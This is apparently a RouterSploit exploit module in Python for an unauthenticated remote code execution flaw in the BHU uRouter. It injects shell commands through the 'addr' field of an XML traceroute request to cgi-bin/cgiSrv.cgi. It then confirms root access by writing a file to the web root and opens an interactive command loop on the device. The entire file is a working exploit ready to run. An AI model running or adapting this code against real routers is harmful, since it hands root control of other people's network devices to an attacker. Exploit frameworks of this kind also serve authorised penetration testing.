from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    http_request,
    validators,
    shell,
    mute,
)


class Exploit(exploits.Exploit):

    """Exploit implementation for unauthenticated RCE vulnerability on BHU uRouter."""

    __info__ = {
        'name': 'BHU uRouter RCE',
        'authors': [
            'Tao "depierre" Sauvage',
        ],
        'description': 'Module exploits BHU uRouter unauthenticated remote code execution vulnerability, which '
                       'allows executing commands on the router with root privileges.',
        'references': [
            'http://www.ioactive.com/pdfs/BHU-WiFi_uRouter-Security_Advisory_Final081716.pdf',
        ],
        'devices': [
            'BHU uRouter',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.62.1', validators=validators.url)
    port = exploits.Option(80, 'Target port')

    def run(self):
        if self.check():
            print_success('Target is vulnerable')
            print_status('Blind command injection - response is not available')
            print_status('Possible extraction point:')
            print_status('\t- Inject "CMD &gt; /usr/share/www/routersploit.check"')
            print_status('\t- The result of CMD will be available at {}:{}/routersploit.check'.format(self.target, self.port))
            print_status("Invoking command loop (type 'exit' or 'quit' to exit the loop)...")
            shell(self, architecture="mipsbe")
        else:
            print_error('Target is not vulnerable')

    def execute(self, cmd):
        url = u'{}:{}/cgi-bin/cgiSrv.cgi'.format(self.target, self.port)
        headers = {u'Content-Type': u'text/xml', u'X-Requested-With': u'XMLHttpRequest'}
        data = u'<cmd><ITEM cmd="traceroute" addr="$({})" /></cmd>'.format(cmd)
        http_request(method=u'POST', url=url, headers=headers, data=data)
        return ''  # Blind RCE so no response available

    @mute
    def check(self):
        url = u'{}:{}/cgi-bin/cgiSrv.cgi'.format(self.target, self.port)
        headers = {u'Content-Type': u'text/xml', u'X-Requested-With': u'XMLHttpRequest'}
        data = u'<cmd><ITEM cmd="traceroute" addr="$({})" /></cmd>'
        # Blind unauth RCE so we first create a file in the www-root directory
        cmd_echo = data.format(u'echo &quot;$USER&quot; &gt; /usr/share/www/routersploit.check')
        response = http_request(method=u'POST', url=url, headers=headers, data=cmd_echo)
        if not response or u'status="doing"' not in response.text:
            return False
        # Second we check that the file was successfully created
        url = u'{}:{}/routersploit.check'.format(self.target, self.port)
        response = http_request(method=u'GET', url=url)
        if not response.status_code == 200 or u'root' not in response.text:
            return False
        # Third we clean up the temp file. No need to check if successful since we already check that the device was
        # vulnerable at this point.
        cmd_rm = data.format(u'rm -f /usr/share/www/routersploit.check')
        http_request(method=u'POST', url=url, headers=headers, data=cmd_rm)
        return True
